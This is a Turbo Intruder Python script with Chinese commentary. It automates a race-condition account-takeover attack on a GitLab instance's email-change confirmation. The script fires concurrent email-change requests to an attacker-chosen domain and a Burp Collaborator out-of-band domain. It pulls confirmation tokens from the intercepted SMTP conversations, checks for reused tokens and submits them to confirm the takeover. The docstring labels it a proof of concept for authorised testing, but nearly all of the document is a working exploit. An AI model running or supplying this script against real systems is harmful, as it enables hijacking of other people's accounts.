"""
邮件链接提取攻击脚本 - Turbo Intruder

功能说明：
这是一个高级的邮件链接提取攻击脚本，专门用于测试邮件确认机制中的竞态条件漏洞。
通过Collaborator外带技术获取邮件确认链接，并利用竞态条件进行账户接管攻击。

重要提醒：
此脚本需要根据具体目标进行大量定制，请将其视为概念验证。

攻击原理：
1. 利用邮件地址更改功能的竞态条件
2. 通过Collaborator接收确认邮件
3. 提取邮件中的确认令牌
4. 检测令牌重用漏洞
5. 实现账户接管

技术特点：
- Collaborator集成：自动接收和解析邮件
- 竞态条件利用：同时更改多个邮件地址
- 令牌提取：从SMTP对话中提取确认令牌
- 重复检测：识别令牌重用漏洞
- 自动化攻击：完整的攻击流程自动化

使用场景：
- 邮件确认机制安全测试
- 账户接管漏洞挖掘
- 竞态条件漏洞验证
- 邮件系统安全评估

参数配置：
- endpoint: 目标GitLab实例
- concurrentConnections: 1（避免并发冲突）
- engine: Engine.SPIKE（高性能引擎）
- maxRetriesPerRequest: 3（重试机制）

攻击流程：
1. 创建Collaborator客户端
2. 生成外带域名
3. 发送邮件地址更改请求
4. 利用竞态条件同时更改多个地址
5. 监控Collaborator交互
6. 解析SMTP对话提取令牌
7. 检测令牌重用
8. 发送确认请求

安全注意：
- 仅用于授权的安全测试
- 需要根据目标应用定制
- 可能影响目标邮件系统
- 遵守负责任的漏洞披露

定制要点：
- 修改endpoint为实际目标
- 调整请求模板格式
- 更新令牌提取逻辑
- 适配目标的邮件确认流程

使用方法：
1. 根据目标应用定制脚本
2. 配置Collaborator设置
3. 运行脚本监控结果
4. 分析令牌重用情况
"""

import base64

def queueRequests(target, wordlists):
    # 创建邮件链接提取攻击引擎
    engine = RequestEngine(endpoint='https://gitlab.example.com:443',  # 目标GitLab实例
                           concurrentConnections=1,                     # 单连接避免冲突
                           requestsPerConnection=100,                   # 每连接请求数
                           pipeline=False,                              # 禁用管道
                           engine=Engine.SPIKE,                         # 高性能引擎
                           maxRetriesPerRequest=3                       # 重试次数
                           )


    # 邮件确认请求模板
    confirm = r'''GET /users/confirmation?confirmation_token=%s HTTP/2
Host: gitlab.example.com

'''

    # 邮件地址更改请求模板
    change = r'''POST /-/profile HTTP/1.1
Host: gitlab.example.com

email=%s
'''

    token = 'just-starting'  # 初始令牌

    # 执行大量竞态条件测试
    for i in range(50000):
        gate = 'race'+str(i)  # 竞态门控标识
        collab = callbacks.createBurpCollaboratorClientContext()  # 创建Collaborator客户端

        domain1 = collab.generatePayload(True)  # 生成外带域名

        # 第一次邮件地址更改（建立基线）
        engine.queue(change, 'onexyzz'+str(i)+'x@'+domain1)
        time.sleep(1)  # 等待处理

        # 竞态条件攻击：同时更改两个邮件地址
        engine.queue(change, 'twoxyzz'+str(i)+'x@domain-to-spoof', gate=gate)  # 攻击者控制的域名
        engine.queue(change, 'onexyzz'+str(i)+'x@'+domain1, gate=gate)         # Collaborator域名

        engine.openGate(gate)  # 同步发送竞态请求

        x = 0      # 轮询计数器
        seen = 0   # 已见交互数
        tokens = {}  # 令牌存储

        # 监控Collaborator交互（最多10轮，直到看到2个交互）
        while x < 10 and seen < 2:
            time.sleep(1)  # 等待邮件到达
            x += 1
            interactions = collab.fetchAllCollaboratorInteractions()  # 获取所有交互

            for interaction in interactions:
                smtp = interaction.getProperty('conversation')  # 获取SMTP对话
                if smtp == None:
                    continue

                decoded = base64.b64decode(smtp)  # 解码SMTP内容

                # 从邮件内容中提取确认令牌
                token = decoded.partition('confirmation_token=')[2].partition('\r\n')[0]
                if token == '':
                    # print '未找到令牌'
                    continue

                # 提取邮件地址
                email = decoded.partition('RCPT TO:<')[2].partition('@')[0]
                seen += 1

                # 检测令牌重用漏洞
                if token in tokens.keys():
                    if smtp == tokens[token]:
                        continue
                    print '发现重复令牌: '+token  # 令牌重用漏洞！
                    print smtp
                    print tokens[token]
                    print '---------------'
                    engine.cancel()  # 停止攻击

                tokens[token] = smtp  # 存储令牌

                print '获得令牌: '+token+' 用于邮件 '+email
                # 检测是否存在多个邮件地址的令牌
                dupe = ('onexyzz' in decoded and 'twoxyzz' in decoded) or ('onexyzz' in decoded and 'threexyzz' in decoded) or ('twoxyzz' in decoded and 'threexyzz' in decoded)
                # 发送确认请求
                engine.queue(confirm, token+'&dupe='+str(dupe)+'&smtp='+smtp, label=email)
                time.sleep(1)


def handleResponse(req, interesting):
    """
    响应处理函数 - 分析确认请求的响应

    功能：
    - 过滤忽略的响应
    - 检测成功的账户接管
    - 标记重复令牌情况
    - 记录所有相关响应
    """
    # 忽略标记为'ignore'的响应
    if req.label == 'ignore':
        return

    # 检测成功的账户接管攻击
    if req.label and 'xyzz' in req.label and '302 OK' in req.response:
        if req.label not in req.response:
            print '攻击成功，终止攻击'  # 成功接管账户
            table.add(req)
            req.engine.cancel()  # 停止引擎

    # 标记使用重复令牌的请求
    if 'dupe=True' in req.request:
        req.label = req.label + ' dupe'  # 添加重复标记

    # 记录所有响应用于分析
    table.add(req)